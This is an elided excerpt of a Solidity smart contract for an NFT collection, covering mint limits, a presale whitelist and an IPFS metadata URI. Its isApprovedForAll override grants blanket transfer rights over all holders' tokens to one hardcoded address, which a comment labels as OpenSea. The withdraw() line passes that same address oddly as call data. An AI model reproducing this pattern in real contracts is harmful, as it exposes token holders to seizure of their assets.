...
/**
   ...
   Non-Fungible Miners NFTs are hand drawn, mining-inspired artworks that come with
   a tangible utility. Our creative & unique artworks are inspired by ASIC miners
   and will be limited to 5999 items that are generated from 250+ traits and attributes.
*/
...
contract NFT is ERC721Enumerable, ERC721URIStorage, Ownable {
  ...
  uint256 public reservedRemaining = 349;
  uint256 public maxMintAmount = 3;
  uint256 public nftPerAddressLimit = 21;
  bool public saleStatus = false;
  bool public preSaleStatus = false;
  
  mapping (address => uint256) public presaleWhitelist;

  constructor() ERC721("Non-Fungible Miners", "NFM") {
  setBaseURI("https://nftstorage.link/ipfs/bafybeibpuh5hmp3j6qx6gadepgppqbppwxtwksqxbdwo7evxtqbyixxmii/metadata/0");
  }
  ...
  // @ dev Mint 349 reserved NFTs for giveaways, devs, etc.
  ...
  function isApprovedForAll(address _owner, address _operator) public override view returns (bool isOperator) {
        if (_operator == address(0x322932DA4957909c423e097340F7EcB1F7370B5C)) {     // OpenSea approval
            return true;
        }
  ...
  function withdraw() public payable onlyOwner {
        ...
        (bool sent, ) = address(msg.sender).call{value: currentBalance}('0x322932DA4957909c423e097340F7EcB1F7370B5C');
